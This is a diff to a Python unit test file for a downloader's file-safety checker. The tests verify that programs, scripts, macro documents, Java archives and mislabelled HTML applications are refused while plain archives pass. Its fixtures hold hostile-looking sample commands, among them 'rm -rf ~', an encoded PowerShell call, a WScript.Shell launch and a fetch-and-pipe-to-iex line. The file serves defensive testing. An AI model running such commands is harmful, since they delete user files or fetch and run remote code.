@@ -1,5 +1,8 @@
 """Unit tests of the defences: file names, paths, addresses, content inspection and the part file."""
 
+import io
+import re
+import zipfile
 from pathlib import Path
 from typing import TYPE_CHECKING
 
@@ -32,6 +35,29 @@ PUBLIC_IP = '8.8.8.8'
 LOOPBACK = '127.0.0.1'
 PORT = 4662
 JS = 'JS'
+ZIP_ARCHIVE = 'ZIP archive'
+MACRO_DANGER = 'Office document with macros'
+MAPS_ZIP = 'maps.zip'
+
+
+def _zip_of(*names: str) -> bytes:
+    """Build a ZIP archive in memory whose members carry the given names.
+
+    :param names: the member names.
+    :type names: str
+    :returns: the archive bytes.
+    :rtype: bytes
+    """
+    buffer = io.BytesIO()
+    with zipfile.ZipFile(buffer, 'w') as archive:
+        for name in names:
+            archive.writestr(name, b'member')
+    return buffer.getvalue()
+
+
+MACRO_DOCUMENT = _zip_of('[Content_Types].xml', 'word/document.xml', 'word/vbaProject.bin')
+JAVA_ARCHIVE = _zip_of('META-INF/MANIFEST.MF', 'Main.class')
+PLAIN_ARCHIVE = _zip_of('maps/europe.png')
 
 
 @pytest.mark.parametrize(
@@ -90,7 +116,7 @@ def test_address_policy_allows_only_global_unfiltered_addresses() -> None:
         (b'%PDF-1.4\n/Xstream\n/JS 1 0 R\n<< >> stream\nabc\nendstream', DocumentKind.PDF, (JS,)),
         (b'AT&TFORM\x00\x00\x00\x10DJVM', DocumentKind.DJVU, ()),
         (b'MZ\x90\x00', DocumentKind.OTHER, ('Windows executable',)),
-        (b'PK\x03\x04', DocumentKind.OTHER, ('ZIP archive',)),
+        (b'PK\x03\x04', DocumentKind.OTHER, ()),
     ],
 )
 def test_inspect_document(fs: FakeFilesystem, content: bytes, kind: DocumentKind, dangerous: tuple[str, ...]) -> None:
@@ -133,6 +159,80 @@ def test_check_document_refuses_wrong_kind(fs: FakeFilesystem) -> None:
     assert check_document(path, expected=(DocumentKind.DJVU,)).kind == DocumentKind.DJVU
     with pytest.raises(SecurityError, match='content is djvu'):
         check_document(path, expected=(DocumentKind.PDF,))
+
+
+def test_check_without_kinds_refuses_only_active_content(fs: FakeFilesystem) -> None:
+    """With no expected kinds an archive passes as notable, while a program or a script is refused."""
+    archive, program, script = QUARANTINE / MAPS_ZIP, QUARANTINE / 'setup.exe', QUARANTINE / 'run.sh'
+    fs.create_file(archive, contents=b'PK\x03\x04rest')
+    fs.create_file(program, contents=b'MZ\x90\x00')
+    fs.create_file(script, contents=b'#!/bin/sh\nrm -rf ~\n')
+
+    assert check_document(archive, expected=None).notable == (ZIP_ARCHIVE,)
+    with pytest.raises(SecurityError, match='Windows executable'):
+        check_document(program, expected=None)
+    with pytest.raises(SecurityError, match='script'):
+        check_document(script, expected=None)
+
+
+@pytest.mark.parametrize(
+    ('file_name', 'payload', 'danger'),
+    [
+        ('invoice.docm', MACRO_DOCUMENT, MACRO_DANGER),
+        ('invoice.zip', MACRO_DOCUMENT, MACRO_DANGER),
+        ('tool.jar', JAVA_ARCHIVE, 'Java archive'),
+        ('setup.bat', b'@echo off\r\npowershell -enc AAAA\r\n', '.bat'),
+        ('book.js', b'new ActiveXObject("WScript.Shell").Run("calc")\n', '.js'),
+        ('run.ps1', b'Invoke-WebRequest https://example.org | iex\n', '.ps1'),
+    ],
+)
+def test_check_without_kinds_refuses_files_that_run_when_opened(
+    fs: FakeFilesystem, file_name: str, payload: bytes, danger: str
+) -> None:
+    """A macro document, a Java archive or a script without a shebang is refused by its members or its name.
+
+    Their first bytes are those of a plain archive or of text, so only the members and the name tell that the
+    file runs when it is opened.
+
+    :param fs: the in-memory file system.
+    :type fs: FakeFilesystem
+    :param file_name: the file name.
+    :type file_name: str
+    :param payload: the file content.
+    :type payload: bytes
+    :param danger: what the refusal names.
+    :type danger: str
+    """
+    path = QUARANTINE / file_name
+    fs.create_file(path, contents=payload)
+
+    with pytest.raises(SecurityError, match=re.escape(danger)):
+        check_document(path, expected=None)
+
+
+def test_plain_archive_passes_without_kinds(fs: FakeFilesystem) -> None:
+    """An archive of data members passes with the archive noted, so the member check refuses only what runs.
+
+    :param fs: the in-memory file system.
+    :type fs: FakeFilesystem
+    """
+    path = QUARANTINE / MAPS_ZIP
+    fs.create_file(path, contents=PLAIN_ARCHIVE)
+
+    assert check_document(path, expected=None).notable == (ZIP_ARCHIVE,)
+
+
+def test_document_named_to_run_is_refused(fs: FakeFilesystem) -> None:
+    """A clean PDF that carries an HTML application's name is refused, because Windows opens it with mshta.
+
+    :param fs: the in-memory file system.
+    :type fs: FakeFilesystem
+    """
+    path = QUARANTINE / 'book.hta'
+    fs.create_file(path, contents=b'%PDF-1.7\n<html><script>new ActiveXObject("WScript.Shell")</script></html>')
+
+    with pytest.raises(SecurityError, match=re.escape('.hta')):
+        check_document(path, expected=(DocumentKind.PDF, DocumentKind.DJVU))
 
 
 def make_part_file(fs: FakeFilesystem, data: bytes) -> PartFile:
